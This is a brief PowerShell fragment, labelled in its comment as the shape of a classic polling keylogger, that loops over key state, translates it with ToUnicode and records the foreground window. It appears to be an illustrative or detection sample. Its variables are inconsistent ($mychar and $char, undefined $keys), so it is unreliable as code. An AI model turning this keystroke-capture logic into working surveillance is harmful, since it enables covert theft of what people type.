# Classic polling keylogger shape: polled key state translated through
# ToUnicode and tagged with the foreground window.
while ($true) {
  $state = $keys::GetAsyncKeyState(65)
  $char = $keys::ToUnicode(65, 0, $kbd, $buf, 5, 0)
  $hwnd = GetForegroundWindow
  $record += $mychar.ToString()
  Write-Output $record
}
